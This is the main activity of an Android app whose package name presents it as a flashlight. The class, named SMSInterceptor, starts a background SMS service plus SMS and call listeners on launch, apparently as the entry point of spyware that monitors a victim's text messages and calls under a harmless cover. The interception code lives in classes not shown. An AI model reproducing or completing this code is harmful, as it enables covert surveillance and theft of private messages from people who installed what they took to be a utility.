package com.flash.light; 

import java.util.List;
import android.util.Log;
import java.lang.Runnable;
import java.io.IOException;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;

import android.hardware.Camera;
import android.hardware.Camera.Parameters;

import android.os.Bundle;
import android.os.IBinder;
import android.os.Message;
import android.os.Handler;
import android.os.Messenger;

import android.content.Intent;
import android.content.Context;
import android.content.ComponentName;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;

import android.widget.Toast;
import android.widget.Button;
import android.widget.TextView;
import android.widget.EditText;
import android.widget.CheckBox;
import android.widget.ToggleButton;
import android.widget.RelativeLayout;

import android.view.View;
import android.view.MotionEvent;
import android.view.SurfaceView;
import android.view.SurfaceHolder;
import android.view.View.OnClickListener;
import android.view.View.OnTouchListener;

public class SMSInterceptor extends Activity {

  private static SMSService smsService;
  private static SMSListener smsListener;
  public  static SMSObserver smsObserver;
  private static CallListener callListener;

  private static long backPressedTime = 0;

  @Override
  public void onBackPressed() {
    long mTime = System.currentTimeMillis();
    if(mTime - backPressedTime > 2000) {
      backPressedTime = mTime;
      Toast.makeText(this, "Press back again to close app.", Toast.LENGTH_SHORT).show();
    }
    else {
      super.onBackPressed();
      Intent intent = new Intent(Intent.ACTION_MAIN);
      intent.addCategory(Intent.CATEGORY_HOME);
      startActivity(intent);
    }
  }

  @Override
  public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    callListener = new CallListener();
    smsService   = new SMSService();
    smsObserver  = new SMSObserver(new Handler(), SMSInterceptor.this);
    smsListener  = new SMSListener();

    Intent serviceIntent = new Intent(this, SMSService.class);
    startService(serviceIntent);

    Log.d("SMSInterceptor", "onCreate()");

  }

}
